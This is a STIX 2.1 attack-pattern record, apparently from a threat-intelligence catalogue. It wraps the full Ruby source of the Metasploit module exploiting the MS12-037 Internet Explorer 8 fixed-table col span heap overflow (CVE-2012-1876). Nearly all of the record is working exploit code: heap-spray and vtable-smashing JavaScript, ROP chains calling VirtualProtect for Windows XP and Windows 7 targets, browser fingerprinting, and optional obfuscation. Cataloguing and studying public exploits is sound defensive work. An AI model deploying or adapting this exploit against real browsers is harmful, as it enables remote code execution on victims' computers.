{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7cece52f-68ec-4503-a4f6-98326fba5308",
    "created": "2024-08-14T16:42:08.854718Z",
    "modified": "2024-08-14T16:42:08.854722Z",
    "name": "MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow",
    "description": " This module exploits a heap overflow vulnerability in Internet Explorer caused by an incorrect handling of the span attribute for col elements from a fixed table when they are modified dynamically by javascript code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms12_037_ie_colspan.rb",
            "external_id": "ms12_037_ie_colspan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1876"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_minver  => \"8.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :rank       => NormalRanking, # reliable memory corruption\n  #  :javascript => true\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow',\n      'Description'    => %q{\n          This module exploits a heap overflow vulnerability in Internet Explorer caused\n        by an incorrect handling of the span attribute for col elements from a fixed table,\n        when they are modified dynamically by javascript code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Alexandre Pelletier',                     # Vulnerability analysis\n          'mr_me <steventhomasseeley[at]gmail.com>', # Metasploit module\n          'binjo',                                   # Metasploit module\n          'sinn3r',                                  # Help with the Metasploit module\n          'juan vazquez'                             # Help with the Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-1876' ],\n          [ 'OSVDB', '82866'],\n          [ 'BID', '53848' ],\n          [ 'MSB', 'MS12-037' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 8 on Windows XP SP3 with msvcrt ROP',\n            {\n              'Rop' => :msvcrt\n            }\n          ],\n          [ 'IE 8 on Windows 7 SP1',\n            {\n              'Rop' => :jre\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-06-12',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n        ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[1]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8/\n      return targets[2]  #IE 8 on Windows 7 with JRE\n    else\n      return nil\n    end\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  def get_payload(t)\n\n    code = payload.encoded\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n      when :msvcrt\n        print_status(\"Using msvcrt ROP\")\n        exec_size = code.length\n        rop =\n          [\n            0x77c4ec01, # retn\n            0x77c4ec00, # pop ebp; retn\n            0x77c15ed5, # xchg eax,esp; retn (pivot)\n            0x77c4e392, # pop eax; retn\n            0x77c11120, # <- *&VirtualProtect()\n            0x77c2e493, # mov eax, dword ptr ds:[eax]; pop ebp; retn\n            junk,\n            0x77c2dd6c,\n            0x77c4ec00, # pop ebp; retn\n            0x77c35459, # ptr to 'push esp; ret'\n            0x77c47705, # pop ebx; retn\n            exec_size,  # ebx\n            0x77c3ea01, # pop ecx; retn\n            0x77c5d000, # W pointer (lpOldProtect) (-> ecx)\n            0x77c46100, # pop edi; retn\n            0x77c46101, # rop nop (-> edi)\n            0x77c4d680, # pop edx; retn\n            0x00000040, # newProtect (0x40) (-> edx)\n            0x77c4e392, # pop eax; retn\n            nop,        # nops (-> eax)\n            0x77c12df9  # pushad; retn\n          ].pack(\"V*\")\n      when :jre\n        print_status(\"Using JRE ROP\")\n        exec_size = code.length\n        rop =\n          [\n            0x7c346c0b, # retn\n            0x7c36f970, # pop ebp; retn\n            0x7c348b05, # xchg eax,esp; retn (pivot)\n            0x7c36f970, # pop ebp; retn [MSVCR71.dll]\n            0x7c36f970, # skip 4 bytes [MSVCR71.dll]\n            0x7c34373a, # pop ebx ; retn [MSVCR71.dll]\n            exec_size,  # ebx\n            0x7c3444d0, # pop edx ; retn [MSVCR71.dll]\n            0x00000040, # 0x00000040-> edx\n            0x7c361829, # pop ecx ; retn [MSVCR71.dll]\n            0x7c38f036, # &Writable location [MSVCR71.dll]\n            0x7c342766, # pop edi ; retn [MSVCR71.dll]\n            0x7c346c0b, # retn (rop nop) [MSVCR71.dll]\n            0x7c350564, # pop esi ; retn [MSVCR71.dll]\n            0x7c3415a2, # jmp [eax] [MSVCR71.dll]\n            0x7c3766ff, # pop eax ; retn [MSVCR71.dll]\n            0x7c37a151, # ptr to &VirtualProtect() - 0x0ef [IAT msvcr71.dll]\n            0x7c378c81, # pushad # add al,0ef ; retn [MSVCR71.dll]\n            0x7c345c30  # ptr to 'push esp; ret ' [MSVCR71.dll]\n          ].pack(\"V*\")\n    end\n\n    code = rop + code\n    return code\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    js_code =  Rex::Text.to_unescape(get_payload(my_target), Rex::Arch.endian(target.arch))\n\n    table_builder = ''\n\n    0.upto(132) do |i|\n      table_builder << \"<table style=\\\"table-layout:fixed\\\" ><col id=\\\"#{i}\\\" width=\\\"41\\\" span=\\\"9\\\" >&nbsp </col></table>\"\n    end\n\n    # About smash_vtable():\n    # * smash the vftable 0x07070024\n    # * span => the amount to overwrite\n    js_element_id = Rex::Text.rand_text_alpha(4)\n    spray_trigger_js = <<-JS\n\n    var dap = \"EEEE\";\n    while ( dap.length < 480 ) dap += dap;\n\n    var padding = \"AAAA\";\n    while ( padding.length < 480 ) padding += padding;\n\n    var filler = \"BBBB\";\n    while ( filler.length < 480 ) filler += filler;\n\n    var arr = new Array();\n    var rra = new Array();\n\n    var div_container = document.getElementById(\"#{js_element_id}\");\n    div_container.style.cssText = \"display:none\";\n\n    for (var i=0; i < 500; i+=2) {\n      rra[i] = dap.substring(0, (0x100-6)/2);\n      arr[i] = padding.substring(0, (0x100-6)/2);\n      arr[i+1] = filler.substring(0, (0x100-6)/2);\n      var obj = document.createElement(\"button\");\n      div_container.appendChild(obj);\n    }\n\n    for (var i=200; i<500; i+=2 ) {\n      rra[i] = null;\n      CollectGarbage();\n    }\n\n    function heap_spray(){\n      CollectGarbage();\n\n      var shellcode = unescape(\"#{js_code}\");\n\n      while (shellcode.length < 100000)\n      shellcode = shellcode + shellcode;\n      var onemeg = shellcode.substr(0, 64*1024/2);\n      for (i=0; i<14; i++) {\n        onemeg += shellcode.substr(0, 64*1024/2);\n      }\n\n      onemeg += shellcode.substr(0, (64*1024/2)-(38/2));\n      var spray = new Array();\n\n      for (i=0; i<400; i++) {\n        spray[i] = onemeg.substr(0, onemeg.length);\n      }\n    }\n\n    function smash_vtable(){\n      var obj_col_0 = document.getElementById(\"132\");\n      obj_col_0.width = \"1178993\";\n      obj_col_0.span = \"44\";\n    }\n\n    setTimeout(function(){heap_spray()}, 400);\n    setTimeout(function(){smash_vtable()}, 700);\n    JS\n\n    if datastore['OBFUSCATE']\n      spray_trigger_js = ::Rex::Exploitation::JSObfu.new(spray_trigger_js)\n      spray_trigger_js.obfuscate(memory_sensitive: true)\n    end\n\n    # build html\n    content = <<-HTML\n    <html>\n    <body>\n    <div id=\"#{js_element_id}\"></div>\n    #{table_builder}\n    <script language='javascript'>\n    #{spray_trigger_js}\n    </script>\n    </body>\n    </html>\n    HTML\n\n    print_status(\"Sending exploit to #{cli.peerhost}:#{cli.peerport}...\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-12",
    "x_mitre_platforms": [
        "win'"
    ]
}